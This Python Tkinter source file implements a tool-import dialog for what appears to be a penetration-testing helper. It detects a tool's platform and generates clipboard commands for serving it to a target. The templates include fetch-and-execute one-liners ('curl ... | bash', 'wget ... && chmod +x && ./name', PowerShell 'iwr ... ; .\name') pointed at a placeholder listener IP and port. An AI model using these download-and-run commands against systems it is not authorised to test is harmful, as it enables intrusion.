"""
settings/tool_import.py — shared "import a tool" plumbing used by both
tab_toolbelt.py and tab_files.py.
"""

import os
import shutil
import subprocess
import tkinter as tk
from pathlib import Path

BG     = "#0d1117"
BG2    = "#161b22"
BG3    = "#21262d"
BG4    = "#2d333b"
BORDER = "#30363d"
ACCENT = "#d73a49"
GREEN  = "#3fb950"
CYAN   = "#58a6ff"
MUTED  = "#8b949e"
FG     = "#e6edf3"
MONO   = "Monospace"

PAD = 18


_SUBDIR_FOR_KIND = {"Linux": "lin", "Windows": "win"}
_PLATFORM_NAMES  = ("Linux", "Windows")


def _default_hotkey(label: str) -> str:
    for ch in label or "":
        if ch.isalnum():
            return ch.lower()
    return ""


def _safe_subdir_name(name: str) -> str:
    """Sanitize an arbitrary section name into something safe to use as a
    folder name (lowercased, alnum/-/_ only). Falls back to 'misc'."""
    norm = (name or "").strip().lower()
    cleaned = "".join(c for c in norm if c.isalnum() or c in "-_")
    return cleaned or "misc"


def _subdir_for_section(section: str) -> str:
    """Folder under tools_base that a given SECTION's tools live in."""
    norm = (section or "").strip().lower()
    if norm == "linux":
        return "lin"
    if norm == "windows":
        return "win"
    return _safe_subdir_name(section)


# ─── platform detection ─────────────────────────────────────────────────────────────────────────

def detect_platform(path: Path) -> str:
    """Best-effort guess of what OS a dropped-in tool belongs to.
    Checks magic bytes / shebang first (cheap, no subprocess), then extension,
    then falls back to the `file(1)` utility if it's on PATH. Returns
    'Linux', 'Windows', or 'Unknown'.
    """
    try:
        with open(path, "rb") as fh:
            head = fh.read(4096)
    except OSError:
        head = b""

    if head[:2] == b"MZ":
        return "Windows"
    if head[:4] == b"\x7fELF":
        return "Linux"
    if head[:2] == b"#!":
        return "Linux"

    ext = path.suffix.lower()
    if ext in {".exe", ".dll", ".msi", ".ps1", ".psm1", ".bat", ".cmd"}:
        return "Windows"
    if ext in {".sh", ".py", ".pl", ".rb"}:
        return "Linux"

    # extensionless compiled binaries (pspy64, chisel, ...) — ask `file` if we can
    try:
        out = subprocess.run(
            ["file", "-b", str(path)], capture_output=True, text=True, timeout=3
        ).stdout.lower()
        if "pe32" in out or "ms-dos executable" in out or "dos batch" in out:
            return "Windows"
        if "elf" in out or "shell script" in out or ("ascii text" in out and ext == ""):
            return "Linux"
    except (OSError, subprocess.SubprocessError):
        pass

    return "Unknown"


# ─── command builder ───────────────────────────────────────────────────────────────────

def _rel_url(path: Path, tools_base: Path) -> str:
    try:
        return path.relative_to(tools_base).as_posix()
    except ValueError:
        return path.name


def tmpl_curl_bash(rel: str) -> str:
    return f"curl -s http://{{IP}}:{{PORT}}/{rel} | bash"

def tmpl_curl_python(rel: str) -> str:
    return f"curl -s http://{{IP}}:{{PORT}}/{rel} | python3"

def tmpl_wget_run(rel: str, name: str) -> str:
    return f"wget http://{{IP}}:{{PORT}}/{rel} && chmod +x {name} && ./{name}"

def tmpl_wget_only(rel: str, name: str) -> str:
    return f"wget http://{{IP}}:{{PORT}}/{rel} -O {name}"

def tmpl_iwr_run(rel: str, name: str) -> str:
    return f"iwr http://{{IP}}:{{PORT}}/{rel} -OutFile {name}; .\\{name}"

def tmpl_iwr_import_module(rel: str, name: str) -> str:
    return f"iwr http://{{IP}}:{{PORT}}/{rel} -OutFile {name}; Import-Module .\\{name}"

def tmpl_iwr_only(rel: str, name: str) -> str:
    return f"iwr http://{{IP}}:{{PORT}}/{rel} -OutFile {name}"


def suggest_command(path: Path, tools_base: Path, kind: str) -> str:
    """One reasonable starting-point command template; the popup's builder
    buttons let the user swap it for one of the others in tmpl_* above."""
    name = path.name
    rel = _rel_url(path, tools_base)
    ext = path.suffix.lower()

    if kind == "Windows":
        if ext == ".ps1":
            return tmpl_iwr_import_module(rel, name)
        if ext in {".bat", ".cmd"}:
            return f"iwr http://{{IP}}:{{PORT}}/{rel} -OutFile {name}; cmd /c {name}"
        return tmpl_iwr_run(rel, name)

    if kind == "Linux":
        if ext == ".sh":
            return tmpl_curl_bash(rel)
        if ext == ".py":
            return tmpl_curl_python(rel)
        return tmpl_wget_run(rel, name)

    return tmpl_wget_only(rel, name)


# ─── small shared UI helpers ────────────────────────────────────────────────────────────

def _header(parent, text: str):
    """Small ACCENT-colored uppercase label + separator rule, matching the
    section-header convention used elsewhere in the settings UI (see
    tab_files.py 'TOOLS DIRECTORY' / 'FILES ON DISK')."""
    row = tk.Frame(parent, bg=BG2)
    row.pack(fill="x", pady=(14, 6))
    tk.Label(row, text=text, font=(MONO, 8, "bold"),
              bg=BG2, fg=ACCENT, anchor="w").pack(side="left")
    tk.Frame(row, bg=BORDER, height=1).pack(side="left", fill="x", expand=True, padx=(8, 0))
    return row


def _field_label(parent, text: str):
    tk.Label(parent, text=text, font=(MONO, 8), bg=BG2, fg=MUTED, anchor="w").pack(fill="x")


def _entry(parent, textvariable, **kw):
    defaults = dict(font=(MONO, 10), bg=BG3, fg=FG, insertbackground=FG,
                     relief="flat", bd=0, highlightthickness=1,
                     highlightbackground=BORDER, highlightcolor=CYAN)
    defaults.update(kw)
    return tk.Entry(parent, textvariable=textvariable, **defaults)


def _button(parent, text, command, *, fg=CYAN, bold=False, **kw):
    defaults = dict(font=(MONO, 9, "bold" if bold else "normal"),
                     bg=BG3, fg=fg, activebackground=BORDER, activeforeground=FG,
                     relief="flat", bd=0, padx=10, pady=5, cursor="hand2",
                     highlightthickness=1, highlightbackground=BORDER)
    defaults.update(kw)
    return tk.Button(parent, text=text, command=command, **defaults)


# ─── file picker (browse dirs, pick one file) ────────────────────────────────

class FilePicker(tk.Toplevel): # why wouldnt we duplicate this again in COMPS.PY FFS
    """Themed file browser. Unlike tab_files.DirBrowser (folders only), this
    lists files too and lets the user pick one. """

    def __init__(self, parent, start_path: str, on_select):
        super().__init__(parent)
        self.on_select = on_select
        self.selected: Path | None = None

        self.title("Select a file to import")
        self.configure(bg=BG)
        self.geometry("560x460")
        self.minsize(420, 340)
        self.transient(parent.winfo_toplevel())
        self.grab_set()

        start = Path(start_path).expanduser() if start_path else Path.home()
        if not start.exists():
            start = Path.home()
        self.current = start if start.is_dir() else start.parent
        self.current = self.current.resolve()

        top = tk.Frame(self, bg=BG2)
        top.pack(fill="x")
        inner_top = tk.Frame(top, bg=BG2, padx=12, pady=10)
        inner_top.pack(fill="x")

        tk.Button(inner_top, text="↑", font=(MONO, 10, "bold"),
                  bg=BG3, fg=CYAN, activebackground=BORDER, activeforeground=FG,
                  relief="flat", bd=0, padx=8, pady=2, cursor="hand2",
                  command=self._go_up, highlightthickness=1,
                  highlightbackground=BORDER).pack(side="left", padx=(0, 8))

        self.path_var = tk.StringVar()
        entry = _entry(inner_top, self.path_var)
        entry.pack(side="left", fill="x", expand=True, ipady=5)
        entry.bind("<Return>", self._go_to_typed)

        list_outer = tk.Frame(self, bg=BG2)
        list_outer.pack(fill="both", expand=True)

        self.canvas = tk.Canvas(list_outer, bg=BG2, bd=0, highlightthickness=0, relief="flat")
        sb = tk.Scrollbar(list_outer, orient="vertical", command=self.canvas.yview,
                           bg=BG3, troughcolor=BG2, activebackground=BORDER)
        self.list_frame = tk.Frame(self.canvas, bg=BG2)
        self.list_frame.bind("<Configure>",
                              lambda e: self.canvas.configure(scrollregion=self.canvas.bbox("all")))
        self.canvas.create_window((0, 0), window=self.list_frame, anchor="nw")
        self.canvas.configure(yscrollcommand=sb.set)
        self.canvas.pack(side="left", fill="both", expand=True)
        sb.pack(side="right", fill="y")
        self.canvas.bind("<Enter>", lambda e: self._bind_wheel())
        self.canvas.bind("<Leave>", lambda e: self._unbind_wheel())

        foot = tk.Frame(self, bg=BG2)
        foot.pack(fill="x")
        foot_inner = tk.Frame(foot, bg=BG2, padx=12, pady=10)
        foot_inner.pack(fill="x")

        self.sel_label = tk.Label(foot_inner, text="no file selected", font=(MONO, 8),
                                   bg=BG2, fg=MUTED, anchor="w")
        self.sel_label.pack(side="left")

        _button(foot_inner, "cancel", self.destroy, fg=MUTED).pack(side="right", padx=(6, 0))

        self.select_btn = _button(foot_inner, "✓  import this file", self._confirm,
                                   fg=MUTED, bold=True)
        self.select_btn.config(state="disabled")
        self.select_btn.pack(side="right")

        self._populate()

    # -- scrolling -- ─────────────────────────────────────────────
    def _bind_wheel(self):
        self.canvas.bind_all("<MouseWheel>", self._on_wheel)
        self.canvas.bind_all("<Button-4>", self._on_wheel)
        self.canvas.bind_all("<Button-5>", self._on_wheel)

    def _unbind_wheel(self):
        self.canvas.unbind_all("<MouseWheel>")
        self.canvas.unbind_all("<Button-4>")
        self.canvas.unbind_all("<Button-5>")

    def _on_wheel(self, event):
        if getattr(event, "num", None) == 5 or getattr(event, "delta", 0) < 0:
            self.canvas.yview_scroll(1, "units")
        elif getattr(event, "num", None) == 4 or getattr(event, "delta", 0) > 0:
            self.canvas.yview_scroll(-1, "units")

    # -- navigation ───────────────────────────
    def _go_up(self):
        parent = self.current.parent
        if parent != self.current:
            self.current = parent
            self._populate()

    def _go_to_typed(self, *_):
        typed = Path(self.path_var.get()).expanduser()
        if typed.is_dir() and os.access(typed, os.R_OK):
            self.current = typed.resolve()
            self._populate()
        elif typed.is_file():
            self._set_selected(typed)

    def _enter(self, d: Path):
        self.current = d
        self._populate()

    def _set_selected(self, f: Path):
        self.selected = f
        self.sel_label.config(text=f"selected: {f.name}", fg=GREEN)
        self.select_btn.config(state="normal", fg=GREEN)

    def _confirm(self):
        if self.selected is not None:
            chosen = str(self.selected)
            self.destroy()
            self.on_select(chosen)

    def _populate(self):
        self.path_var.set(str(self.current))
        for w in self.list_frame.winfo_children():
            w.destroy()

        try:
            entries = sorted(self.current.iterdir(), key=lambda p: (p.is_file(), p.name.lower()))
        except PermissionError:
            entries = []
            tk.Label(self.list_frame, text="permission denied reading this folder",
                     font=(MONO, 9), bg=BG2, fg=ACCENT).pack(anchor="w", padx=14, pady=10)

        for entry in entries:
            if entry.name.startswith(".") and entry.is_file():
                continue
            row = tk.Frame(self.list_frame, bg=BG2)
            row.pack(fill="x")
            is_dir = entry.is_dir()
            icon = "📁" if is_dir else "📄"
            lbl = tk.Label(row, text=f"{icon}  {entry.name}", font=(MONO, 10),
                            bg=BG2, fg=FG if is_dir else MUTED, anchor="w", padx=14, pady=6)
            lbl.pack(side="left", fill="x", expand=True)

            def on_enter(e, r=row):
                r.configure(bg=BG4)
                for c in r.winfo_children():
                    c.configure(bg=BG4)

            def on_leave(e, r=row):
                r.configure(bg=BG2)
                for c in r.winfo_children():
                    c.configure(bg=BG2)

            for w in (row, lbl):
                w.bind("<Enter>", on_enter)
                w.bind("<Leave>", on_leave)
                w.configure(cursor="hand2")
                if is_dir:
                    w.bind("<Button-1>", lambda e, d=entry: self._enter(d))
                    w.bind("<Double-Button-1>", lambda e, d=entry: self._enter(d))
                else:
                    w.bind("<Button-1>", lambda e, f=entry: self._set_selected(f))
                    w.bind("<Double-Button-1>", lambda e, f=entry: (self._set_selected(f), self._confirm()))


# ─── import config popup ──────────────────────────────────────────────────────

class ImportDialog(tk.Toplevel):
    """'Configure this tool' popup shown after a file is picked.
    """

    def __init__(self, parent, path: Path, tools_base: Path, sections,
                 default_section: str, detected_kind: str,
                 example_ip: str, example_port, on_save):
        super().__init__(parent)
        self.path = path
        self.tools_base = tools_base
        self.on_save = on_save
        self.example_ip = example_ip
        self.example_port = example_port

        self._detected_kind = detected_kind          
        self.kind = detected_kind if detected_kind in _PLATFORM_NAMES else "Linux"
        self.section_var_value = ""                 

        self.title(f"Import: {path.name}")
        self.configure(bg=BG2)
        self.transient(parent.winfo_toplevel())
        self.resizable(False, False)
        try:
            self.attributes("-topmost", True)
        except tk.TclError:
            pass

        inner = tk.Frame(self, bg=BG2, padx=PAD, pady=16)
        inner.pack(fill="both", expand=True)

        tk.Label(inner, text=str(path), font=(MONO, 8), bg=BG2, fg=MUTED,
                 anchor="w", wraplength=440, justify="left").pack(fill="x")

        # ── section  & platform) ─────────────────────────────────────────────────────
        _header(inner, "SECTION")

        pill_row = tk.Frame(inner, bg=BG2)
        pill_row.pack(fill="x")

        pill_options = list(_PLATFORM_NAMES)
        for sec in list(sections) + [default_section]:
            if sec and sec.strip().lower() not in ("linux", "windows") and sec not in pill_options:
                pill_options.append(sec)

        self._sec_btns = {}
        self._sec_is_platform = {sec: sec.lower() in ("linux", "windows") for sec in pill_options}
        for sec in pill_options:
            b = _button(pill_row, sec, lambda s=sec: self._set_section(s), fg=CYAN)
            b.pack(side="left", padx=(0, 6))
            self._sec_btns[sec] = b

        custom_row = tk.Frame(inner, bg=BG2)
        custom_row.pack(fill="x", pady=(8, 0))
        tk.Label(custom_row, text="or new:", font=(MONO, 8), bg=BG2, fg=BORDER).pack(side="left")
        self.section_entry_var = tk.StringVar()
        sec_entry = _entry(custom_row, self.section_entry_var, width=16)
        sec_entry.pack(side="left", ipady=3, padx=(6, 0))
        self.section_entry_var.trace_add(
            "write", lambda *_: self._set_section(self.section_entry_var.get().strip(), from_entry=True))

        self.platform_note = tk.Label(inner, text="", font=(MONO, 8), bg=BG2, fg=BORDER, anchor="w")
        self.platform_note.pack(fill="x", pady=(8, 0))

        # ── nickname ────────────────────────────────────────────────────────────────
        _header(inner, "NICKNAME")
        self.nickname_var = tk.StringVar(value=path.stem)
        nickname_entry = _entry(inner, self.nickname_var)
        nickname_entry.pack(fill="x", ipady=5)
        tk.Label(inner, text="used for the tray label and default hotkey", font=(MONO, 8),
                 bg=BG2, fg=BORDER, anchor="w").pack(fill="x", pady=(4, 0))

        # ── copy-into-tools-dir checkbox ───────────────────────────────────
        self.copy_var = tk.BooleanVar(value=False)
        copy_row = tk.Frame(inner, bg=BG2)
        copy_row.pack(fill="x", pady=(10, 0))
        self.copy_cb = tk.Checkbutton(
            copy_row, text="copy file into tools folder so it's servable",
            variable=self.copy_var, font=(MONO, 8), bg=BG2, fg=MUTED,
            selectcolor=BG3, activebackground=BG2, activeforeground=FG,
            anchor="w", command=self._refresh_preview)
        self.copy_cb.pack(fill="x")

        # ── command builder ─────────────────────────────────────────────────
        _header(inner, "CLIPBOARD COMMAND")

        builder_row = tk.Frame(inner, bg=BG2)
        builder_row.pack(fill="x", pady=(0, 6))
        tk.Label(builder_row, text="insert:", font=(MONO, 8), bg=BG2, fg=BORDER).pack(side="left")
        self._builder_frame = builder_row

        cmd_frame = tk.Frame(inner, bg=BG3, highlightthickness=1, highlightbackground=BORDER)
        cmd_frame.pack(fill="both", expand=True)
        self.cmd_text = tk.Text(cmd_frame, font=(MONO, 9), bg=BG3, fg=FG,
                                 insertbackground=FG, relief="flat", bd=0,
                                 wrap="char", height=6, width=52, padx=8, pady=6,
                                 highlightthickness=0)
        cmd_scroll = tk.Scrollbar(cmd_frame, orient="vertical", command=self.cmd_text.yview,
                                   bg=BG3, troughcolor=BG2, activebackground=BORDER)
        self.cmd_text.configure(yscrollcommand=cmd_scroll.set)
        self.cmd_text.pack(side="left", fill="both", expand=True)
        cmd_scroll.pack(side="right", fill="y")
        self.cmd_text.bind("<KeyRelease>", lambda e: self._refresh_preview())

        tk.Label(inner, text="preview with current listener values:", font=(MONO, 8),
                 bg=BG2, fg=BORDER, anchor="w").pack(fill="x", pady=(8, 0))
        self.preview_label = tk.Label(inner, text="", font=(MONO, 8), bg=BG2, fg=CYAN,
                                       anchor="w", wraplength=440, justify="left")
        self.preview_label.pack(fill="x", pady=(2, 12))

        self.status = tk.Label(inner, text="", font=(MONO, 8), bg=BG2, fg=GREEN, anchor="w")

        btn_row = tk.Frame(inner, bg=BG2)
        btn_row.pack(fill="x")
        _button(btn_row, "cancel", self.destroy, fg=MUTED).pack(side="right", padx=(8, 0))
        _button(btn_row, "💾 save & import", self._do_save, fg=GREEN, bold=True).pack(side="right")
        self.status.pack(side="left")

        self.bind("<Escape>", lambda e: self.destroy())
        nickname_entry.focus_set()
        nickname_entry.select_range(0, "end")

        # ── initial state ─────────────────────────────────────────────────────────────────────────────────
        self._set_section(default_section)
        self._sync_platform_ui(reset_command=True)

        self.update_idletasks()
        root = parent.winfo_toplevel()
        x = root.winfo_rootx() + max((root.winfo_width() - self.winfo_width()) // 2, 0)
        y = root.winfo_rooty() + max((root.winfo_height() - self.winfo_height()) // 4, 0)
        self.geometry(f"+{x}+{y}")
        self.grab_set()

    # -- helpers ─────────────────────────────────────────────────────────────────

    def _current_section(self) -> str:
        return self.section_entry_var.get().strip() or self.section_var_value or self.kind

    def _expected_subdir(self) -> Path:
        """Where the file needs to live for the currently selected section."""
        return self.tools_base / _subdir_for_section(self._current_section())

    def _needs_copy(self) -> bool:
        """True if the source file isn't already sitting in the subfolder
        that matches the currently selected section. Re-evaluated on every
        section switch — Linux, Windows, or custom."""
        try:
            return self.path.parent.resolve() != self._expected_subdir().resolve()
        except OSError:
            return True

    def _current_rel(self) -> str:
        """URL path the command should reference, accounting for a pending copy."""
        if self._needs_copy() and self.copy_var.get():
            subdir = _subdir_for_section(self._current_section())
            return f"{subdir}/{self.path.name}"
        return _rel_url(self.path, self.tools_base)

    def _refresh_copy_checkbox(self):
        """Update the persistent copy checkbox for the current section."""
        subdir = _subdir_for_section(self._current_section())
        needs = self._needs_copy()
        self.copy_var.set(needs)
        if needs:
            self.copy_cb.config(
                text=f"copy file into tools folder ({subdir}/) so it's servable",
                fg=MUTED, state="normal")
        else:
            self.copy_cb.config(
                text=f"file already in tools folder ({subdir}/) — no copy needed",
                fg=BORDER, state="disabled")

    def _style_pill(self, btn: tk.Button, active: bool, is_platform: bool):
        if active:
            btn.config(bg=CYAN, fg=BG)
        else:
            btn.config(bg=BG3, fg=CYAN if is_platform else FG)

    def _highlight_section(self, sec: str, from_entry: bool):
        for s, b in self._sec_btns.items():
            active = (s == sec) and not from_entry
            self._style_pill(b, active, self._sec_is_platform.get(s, False))

    def _set_section(self, sec: str, from_entry: bool = False):
        if not sec:
            return
        self.section_var_value = sec
        self._highlight_section(sec, from_entry)

        norm = sec.strip().lower()
        kind_changed = False
        if norm in ("linux", "windows"):
            new_kind = "Linux" if norm == "linux" else "Windows"
            kind_changed = new_kind != self.kind
            self.kind = new_kind

        self._sync_platform_ui(reset_command=kind_changed)

    def _sync_platform_ui(self, reset_command: bool):
        if self._detected_kind == "Unknown":
            note = "platform: pick Linux or Windows above to generate a matching command"
        elif self.kind == self._detected_kind:
            note = f"platform: {self.kind}  (auto-detected)"
        else:
            note = f"platform: {self.kind}"
        self.platform_note.config(text=note)

        self._rebuild_builder_buttons()
        self._refresh_copy_checkbox()

        if reset_command:
            self.cmd_text.delete("1.0", "end")
            self.cmd_text.insert("1.0", suggest_command(self.path, self.tools_base, self.kind))
            self._refresh_preview()

    def _rebuild_builder_buttons(self):
        for w in list(self._builder_frame.winfo_children()):
            if isinstance(w, tk.Button):
                w.destroy()
        name = self.path.name
        if self.kind == "Windows":
            options = [
                ("iwr + run", lambda: tmpl_iwr_run(self._current_rel(), name)),
                ("iwr + Import-Module", lambda: tmpl_iwr_import_module(self._current_rel(), name)),
                ("iwr only", lambda: tmpl_iwr_only(self._current_rel(), name)),
            ]
        else:
            options = [
                ("curl | bash", lambda: tmpl_curl_bash(self._current_rel())),
                ("curl | python3", lambda: tmpl_curl_python(self._current_rel())),
                ("wget + chmod + run", lambda: tmpl_wget_run(self._current_rel(), name)),
                ("wget only", lambda: tmpl_wget_only(self._current_rel(), name)),
            ]
        for label, factory in options:
            b = _button(self._builder_frame, label, lambda f=factory: self._apply_builder(f), fg=CYAN)
            b.config(font=(MONO, 8), padx=8, pady=3)
            b.pack(side="left", padx=(0, 6))

    def _apply_builder(self, factory):
        self.cmd_text.delete("1.0", "end")
        self.cmd_text.insert("1.0", factory())
        self._refresh_preview()

    def _refresh_preview(self):
        cmd = self.cmd_text.get("1.0", "end").rstrip("\n")
        preview = cmd.replace("{IP}", str(self.example_ip)).replace("{PORT}", str(self.example_port))
        self.preview_label.config(text=preview)

    def _do_save(self):
        nickname = self.nickname_var.get().strip()
        section = self.section_entry_var.get().strip() or getattr(self, "section_var_value", "")
        command = self.cmd_text.get("1.0", "end").rstrip("\n")

        if not nickname:
            self.status.config(text="✗ nickname can't be empty", fg=ACCENT)
            return
        if not section:
            self.status.config(text="✗ pick or type a section", fg=ACCENT)
            return
        if not command.strip():
            self.status.config(text="✗ command can't be empty", fg=ACCENT)
            return

        if self._needs_copy() and self.copy_var.get():
            try:
                subdir = _subdir_for_section(section)
                dest_dir = self.tools_base / subdir
                dest_dir.mkdir(parents=True, exist_ok=True)
                dest = dest_dir / self.path.name
                shutil.copy2(self.path, dest)
            except OSError as e:
                self.status.config(text=f"✗ copy failed: {e}", fg=ACCENT)
                return

        entry = {
            "command": command,
            "nickname": nickname,
            "hotkey": _default_hotkey(nickname),
        }
        self.on_save(section, nickname, entry)
        self.status.config(text="✓ imported")
        self.after(250, self.destroy)


# ─── manual "just a command" import popup ────────────────────────────────────

class CommandImportDialog(tk.Toplevel):

    def __init__(self, parent, sections, default_section: str, on_save):
        super().__init__(parent)
        self.on_save = on_save
        self.section_var_value = ""

        self.title("Import command")
        self.configure(bg=BG2)
        self.transient(parent.winfo_toplevel())
        self.resizable(False, False)
        try:
            self.attributes("-topmost", True)
        except tk.TclError:
            pass

        inner = tk.Frame(self, bg=BG2, padx=PAD, pady=16)
        inner.pack(fill="both", expand=True)

        # ── section ──────────────────────────────────────────────────────────
        _header(inner, "SECTION")

        pill_row = tk.Frame(inner, bg=BG2)
        pill_row.pack(fill="x")

        pill_options = []
        for sec in list(sections) + [default_section]:
            if sec and sec not in pill_options:
                pill_options.append(sec)

        self._sec_btns = {}
        for sec in pill_options:
            b = _button(pill_row, sec, lambda s=sec: self._set_section(s), fg=CYAN)
            b.pack(side="left", padx=(0, 6))
            self._sec_btns[sec] = b

        custom_row = tk.Frame(inner, bg=BG2)
        custom_row.pack(fill="x", pady=(8, 0))
        tk.Label(custom_row, text="or new:", font=(MONO, 8), bg=BG2, fg=BORDER).pack(side="left")
        self.section_entry_var = tk.StringVar()
        sec_entry = _entry(custom_row, self.section_entry_var, width=16)
        sec_entry.pack(side="left", ipady=3, padx=(6, 0))
        self.section_entry_var.trace_add(
            "write", lambda *_: self._set_section(self.section_entry_var.get().strip(), from_entry=True))

        # ── nickname ─────────────────────────────────────────────────────────
        _header(inner, "NICKNAME")
        self.nickname_var = tk.StringVar()
        nickname_entry = _entry(inner, self.nickname_var)
        nickname_entry.pack(fill="x", ipady=5)
        tk.Label(inner, text="used for the tray label and default hotkey", font=(MONO, 8),
                 bg=BG2, fg=BORDER, anchor="w").pack(fill="x", pady=(4, 0))

        # ── command ──────────────────────────────────────────────────────────
        _header(inner, "CLIPBOARD COMMAND")

        cmd_frame = tk.Frame(inner, bg=BG3, highlightthickness=1, highlightbackground=BORDER)
        cmd_frame.pack(fill="both", expand=True, pady=(0, 6))
        self.cmd_text = tk.Text(cmd_frame, font=(MONO, 9), bg=BG3, fg=FG,
                                 insertbackground=FG, relief="flat", bd=0,
                                 wrap="char", height=7, width=52, padx=8, pady=6,
                                 highlightthickness=0)
        cmd_scroll = tk.Scrollbar(cmd_frame, orient="vertical", command=self.cmd_text.yview,
                                   bg=BG3, troughcolor=BG2, activebackground=BORDER)
        self.cmd_text.configure(yscrollcommand=cmd_scroll.set)
        self.cmd_text.pack(side="left", fill="both", expand=True)
        cmd_scroll.pack(side="right", fill="y")

        tk.Label(inner, text="{IP} and {PORT} are filled in automatically at copy time.",
                 font=(MONO, 8), bg=BG2, fg=BORDER, anchor="w",
                 justify="left", wraplength=340).pack(fill="x", pady=(0, 12))

        self.status = tk.Label(inner, text="", font=(MONO, 8), bg=BG2, fg=GREEN, anchor="w")

        btn_row = tk.Frame(inner, bg=BG2)
        btn_row.pack(fill="x")
        _button(btn_row, "cancel", self.destroy, fg=MUTED).pack(side="right", padx=(8, 0))
        _button(btn_row, "💾 save & import", self._do_save, fg=GREEN, bold=True).pack(side="right")
        self.status.pack(side="left")

        self.bind("<Escape>", lambda e: self.destroy())
        nickname_entry.focus_set()

        self._set_section(default_section)

        self.update_idletasks()
        root = parent.winfo_toplevel()
        x = root.winfo_rootx() + max((root.winfo_width() - self.winfo_width()) // 2, 0)
        y = root.winfo_rooty() + max((root.winfo_height() - self.winfo_height()) // 4, 0)
        self.geometry(f"+{x}+{y}")
        self.grab_set()

    def _style_pill(self, btn: tk.Button, active: bool):
        if active:
            btn.config(bg=CYAN, fg=BG)
        else:
            btn.config(bg=BG3, fg=FG)

    def _set_section(self, sec: str, from_entry: bool = False):
        if not sec:
            return
        self.section_var_value = sec
        for s, b in self._sec_btns.items():
            self._style_pill(b, (s == sec) and not from_entry)

    def _do_save(self):
        nickname = self.nickname_var.get().strip()
        section = self.section_entry_var.get().strip() or self.section_var_value
        command = self.cmd_text.get("1.0", "end").rstrip("\n")

        if not nickname:
            self.status.config(text="✗ nickname can't be empty", fg=ACCENT)
            return
        if not section:
            self.status.config(text="✗ pick or type a section", fg=ACCENT)
            return
        if not command.strip():
            self.status.config(text="✗ command can't be empty", fg=ACCENT)
            return

        entry = {
            "command": command,
            "nickname": nickname,
            "hotkey": _default_hotkey(nickname),
            "path": None,
        }
        self.on_save(section, nickname, entry)
        self.status.config(text="✓ imported")
        self.after(250, self.destroy)